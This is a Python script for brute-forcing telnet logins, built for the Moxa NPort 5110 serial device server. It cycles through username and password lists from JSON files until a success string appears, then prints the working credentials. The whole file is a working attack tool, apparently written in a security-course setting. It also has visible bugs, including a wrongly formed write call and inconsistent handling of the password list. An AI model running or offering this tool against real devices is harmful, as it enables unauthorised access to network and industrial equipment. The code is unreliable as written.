#!/usr/bin/env python3

"""
Telnet authentication brute force script
Made to work on Moxa Nport 5110

Author: Erik Lamers <erik.lamers@os3.nl>

TODO: Implement multiprocessing
"""

from argparse import ArgumentParser
from ipaddress import ip_address
import telnetlib
from json import load
from os.path import isfile

def parse_args():
    parser = ArgumentParser(description='Telnet authentication brute force script')

    parser.add_argument('host', help='The telnet host to connect to (IP)')
    parser.add_argument('-p', '--port', type=int, default=23, help='The telnet port to connect to (default 23)')
    parser.add_argument('-uf', '--username-file', default='usernames.json', help='The username file to use (filepath)')
    parser.add_argument('-pf', '--password-file', default='passwords.json', help='The password file to use (filepath)')
    parser.add_argument('--password-only', action='store_true', help='Only authenticate using passwords')
    parser.add_argument('--success_string', help='Login successful when this string is found in output',
                        default='selection:')

    return parser.parse_args()


def argument_validation(arguments):
    """
    Validates given arguments for correctness
    :param arguments: The args generated by parse_args
    """
    # Validate given host address
    try:
        ip_address(arguments.host)
    except ValueError as e:
        exit_with_message('ERROR in host address: {}'.format(e))

    # Check if the filepaths are valid
    if not isfile(arguments.password_file):
        exit_with_message('ERROR: {} is not a valid file'.format(arguments.password_file))
    if not arguments.password_only:
        if not isfile(arguments.username_file):
            exit_with_message('ERROR: {} is not a valid file'.format(arguments.username_file))

def get_telnet_connection(host, port):
    """
    Tries to establish telnet connection
    :param host: str: The host to connect to
    :param port: int: The telnet port to connect to
    :return: connection: The connection object
    """
    try:
        connection = telnetlib.Telnet(host=host, port=port, timeout=5)
        return connection
    except Exception as e:
        exit_with_message('ERROR: unable to connect to {}\nGot error: {}'.format(host, e))

def get_json_values_from_file(file):
    """
    Read json values from file
    :param file: The file to read the values from
    :return: values: list: The values read from file
    """
    try:
        with open(file, 'r') as fh:
            values = load(fh)
        return values
    except OSError as e:
        exit_with_message('ERROR: could not open {}\n Got error: {}'.format(file, e))

def try_login_combination(connection, username, password, password_only=False, success_string=None):
    """
    Try a login combination on a telnet connection
    :param connection: The telnet connection
    :param username: str: The username to try
    :param password: str: The password to try
    :param password_only: bool: Only password authentication is required
    :param success_string: str: If this string is in the output, then the login was successful
    :return: success: bool: login successful or not
    """

    if not password_only:
        connection.read_until(b'login: ', timeout=2)
        connection.write(username.encode('ascii'), b'\r')
    connection.read_until(b'password:', timeout=2)
    connection.write(password.encode('ascii') + b'\r')

    ret = connection.read_until(success_string.encode('ascii'), timeout=2)
    success = True if success_string in ret.decode('ascii') else False
    return success

def exit_with_message(message, exit_code=1):
    print(message)
    exit(exit_code)

def login_successful(password, username=None):
    print('Login successful using username: {} and password: {}'.format(username, password))
    exit(0)

def main():
    args = parse_args()
    argument_validation(args)
    usernames = None

    # Get the credentials
    if not args.password_only:
        usernames = get_json_values_from_file(args.username_file)
    passwords = get_json_values_from_file(args.password_file)

    if not args.password_only:
        # For each username we try all password combinations
        for username in usernames['usernames']:
            for password in passwords:
                con = get_telnet_connection(args.host, args.port)
                success = try_login_combination(con, username, password, success_string=args.success_string)
                con.close()
                if success:
                    login_successful(password, username)
    else:
        # Just try password login
        for password in passwords['passwords']:
            con = get_telnet_connection(args.host, args.port)
            success = try_login_combination(con, None, password, password_only=True, success_string=args.success_string)
            con.close()
            if success:
                login_successful(password)

    print('Unable to find Telnet login ... Too bad')

if __name__ == '__main__':
    main()
